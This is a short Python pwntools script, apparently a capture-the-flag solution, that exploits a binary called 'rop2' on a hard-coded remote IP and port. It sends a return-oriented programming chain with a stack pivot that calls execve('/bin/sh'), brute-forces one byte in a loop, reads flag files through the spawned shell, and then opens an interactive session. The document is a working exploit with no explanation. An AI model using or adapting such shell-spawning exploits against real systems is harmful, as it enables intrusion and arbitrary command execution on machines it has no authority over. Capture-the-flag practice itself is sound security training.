from pwn import *
import time

context.arch = "amd64"

ip = "140.110.112.77"
port = 3123

data = 0x6CCD60
pop_rsi = 0x401637
pop_rax_rdx_rbx = 0x478616
pop_rdi = 0x401516
syscall = 0x4672b5
pop_rbp = 0x4004d1
leave = 0x4009e4

while True:
    r = remote(ip, port)
    # r = process("./rop2")
    
    r.send(flat(leave, pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdi, data + (10 * 0x8), pop_rsi, 0, syscall, '/bin/sh\x00'))
    
    guess = 112
    r.sendafter("=", flat(data, leave, 0, 0) + p8(guess))
    try:
        while True:
            try:
                time.sleep(0.1)
                r.sendline("cat /home/`whoami`/flag*")
                flag = r.recv()
                if b'{' in flag:
                    r.interactive()
            except:
                r.close()
                break
    except:
        r.close()
r.interactive()
